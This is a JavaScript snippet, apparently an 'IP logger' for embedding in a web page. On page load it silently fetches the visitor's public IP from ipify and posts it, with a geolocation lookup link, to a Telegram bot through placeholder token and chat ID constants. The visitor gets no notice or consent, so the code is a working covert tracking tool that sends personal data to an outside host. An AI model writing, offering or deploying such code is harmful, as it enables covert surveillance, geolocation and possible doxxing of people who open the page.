// Configuration - Replace with your actual credentials securely
const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN';
const CHAT_ID = 'YOUR_CHAT_ID';

/**
 * Sends the collected IP address to the designated Telegram bot
 * @param {string} ip - The IP address to log
 */
function sendToTelegram(ip) {
    const message = `New IP logged: ${ip}.\nhttps://ipapi.co/?q=${ip}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => {
        console.log('Notification sent successfully');
    })
    .catch(error => {
        console.error('Error sending notification:', error);
    });
}

/**
 * Fetches the public IP address of the client
 */
function initializeIpCheck() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            sendToTelegram(data.ip);
        })
        .catch(error => {
            console.error('Error fetching data:', error);
        });
}

// Execute when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', initializeIpCheck);
